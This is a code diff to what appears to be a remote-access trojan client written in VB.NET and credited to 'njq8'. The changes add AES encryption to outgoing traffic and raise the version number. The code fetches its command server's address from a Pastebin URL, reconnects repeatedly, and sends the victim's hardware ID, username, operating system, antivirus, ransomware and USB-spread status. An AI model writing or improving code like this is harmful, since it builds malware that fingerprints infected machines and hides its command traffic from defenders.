@@ -1,12 +1,12 @@
-﻿Imports System.Net
-
-Public Class TCP
+﻿
+Public Class Client
     'credit to njq8
-    Public Shared KEY As String = "|'N'|"
+    Public Shared KEY As String = Convert.ToBase64String(SB("|'N'|"))
     Public Shared SPL As String = "|'L'|"
     Public Shared C As Net.Sockets.TcpClient
     Public Shared R As New Random
     Public Shared T1 As New Threading.Thread(AddressOf RECON)
+    Public Shared CNT As Boolean = False
 
     Public Shared Sub Send(ByVal b As Byte())
         If CNT = False Then Exit Sub
@@ -20,10 +20,11 @@ Public Class TCP
             CNT = False
         End Try
     End Sub
+
     Public Shared Sub Send(ByVal S As String)
-        Send(SB(S))
+        Send(SB(AES_Encrypt(S)))
     End Sub
-    Public Shared CNT As Boolean = False
+
     Public Shared Sub RECON()
         Dim MS As New IO.MemoryStream ' create memory stream
         Dim KA As Integer = 0
@@ -82,7 +83,7 @@ e:      ' clear things and ReConnect
             KA = 0
 
             Try
-                Dim WC As WebClient = New WebClient() 'Pastebin, split by ":" IP:PORT
+                Dim WC As Net.WebClient = New Net.WebClient() 'Pastebin, split by ":" IP:PORT
                 Dim reply As String = WC.DownloadString(Settings.Pastebin)
                 Settings.HOST = reply.Split(":")(0)
                 Settings.PORT = reply.Split(":")(1)
@@ -93,7 +94,7 @@ e:      ' clear things and ReConnect
             C.Client.Connect(Settings.HOST, Settings.PORT)
             CNT = True
             'Send info to server
-            Send("info" & SPL & ID.HWID & SPL & ID.UserName & SPL & IO.Path.GetFileName(Application.ExecutablePath) & SPL & "v0.5.6" & SPL & ID.MyOS & " " & ID.Bit & SPL & ID.INDATE & SPL & ID.AV & SPL & ID.Ransomeware & SPL & ID.USBSP & SPL & " ")
+            Send("info" & SPL & ID.HWID & SPL & ID.UserName & SPL & IO.Path.GetFileName(Application.ExecutablePath) & SPL & "v0.5.7" & SPL & ID.MyOS & " " & ID.Bit & SPL & ID.INDATE & SPL & ID.AV & SPL & ID.Ransomeware & SPL & ID.USBSP & SPL & " ")
         Catch ex As Exception
             Threading.Thread.CurrentThread.Sleep(R.Next(5000))
             GoTo e
